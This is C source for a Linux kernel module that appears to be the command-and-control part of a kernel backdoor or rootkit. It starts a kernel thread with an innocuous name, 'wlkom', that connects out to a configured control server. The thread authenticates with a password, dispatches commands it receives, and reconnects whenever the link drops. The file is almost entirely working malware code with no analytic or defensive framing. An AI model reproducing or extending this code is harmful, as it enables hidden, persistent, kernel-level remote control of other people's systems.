#include "network.h"

#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/slab.h>

#include "commands.h"

static struct socket      *control_sock     = NULL;
static struct task_struct *control_thread   = NULL;
static char                control_ip[64];
static int                 control_port;
static char                control_password[128];
static bool                stop_thread      = false;

/**
 * @brief Receives and dispatches packets until disconnect or stop.
 * @param ctx  Connection context with live socket and authed state.
 */
static void run_packet_loop(conn_ctx_t *ctx)
{
    uint8_t  opcode;
    char    *payload;
    uint32_t payload_len;
    int      ret;

    while (!kthread_should_stop() && !stop_thread)
    {
        payload     = NULL;
        payload_len = 0;
        ret         = recv_packet(ctx, &opcode, &payload, &payload_len);
        if (ret < 0)
        {
            kfree(payload);
            break;
        }
        if (handle_packet(ctx, opcode, payload, payload_len) < 0)
        {
            kfree(payload);
            break;
        }
        kfree(payload);
    }
}

/**
 * @brief Attempts a single TCP connection to control_ip:control_port.
 * @return true on success, false on any error (socket released on failure).
 */
static bool try_connect(void)
{
    struct sockaddr_in addr;

    if (sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &control_sock) < 0)
        return false;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(control_port);
    if (in4_pton(control_ip, -1, (u8 *)&addr.sin_addr.s_addr, -1, NULL) == 0)
    {
        sock_release(control_sock);
        control_sock = NULL;
        return false;
    }
    if (kernel_connect(control_sock, (struct sockaddr *)&addr,
                       sizeof(addr), 0) < 0)
    {
        sock_release(control_sock);
        control_sock = NULL;
        return false;
    }
    return true;
}

/**
 * @brief Kernel thread: connects to the control server, runs the packet loop,
 *        then retries on disconnect.
 * @param data  Unused thread argument.
 * @return Always 0.
 */
static int connect_thread(void *data)
{
    conn_ctx_t ctx;

    while (!kthread_should_stop() && !stop_thread)
    {
        if (!try_connect())
        {
            ssleep(RECONNECT_DELAY);
            continue;
        }
        ctx.sock     = control_sock;
        ctx.authed   = false;
        ctx.password = control_password;
        run_packet_loop(&ctx);
        if (control_sock)
        {
            sock_release(control_sock);
            control_sock = NULL;
        }
        ctx.sock   = NULL;
        ctx.authed = false;
        if (!stop_thread)
            ssleep(RECONNECT_DELAY);
    }
    return 0;
}

int connect_init(const char *ip, int port, const char *password)
{
    strncpy(control_ip, ip, sizeof(control_ip) - 1);
    strncpy(control_password, password, sizeof(control_password) - 1);
    control_port = port;
    stop_thread  = false;
    control_thread = kthread_run(connect_thread, NULL, "wlkom");
    if (IS_ERR(control_thread))
        return -1;
    return 0;
}

void connect_exit(void)
{
    stop_thread = true;
    if (control_sock)
    {
        kernel_sock_shutdown(control_sock, SHUT_RDWR);
        sock_release(control_sock);
        control_sock = NULL;
    }
    if (control_thread)
    {
        kthread_stop(control_thread);
        control_thread = NULL;
    }
}
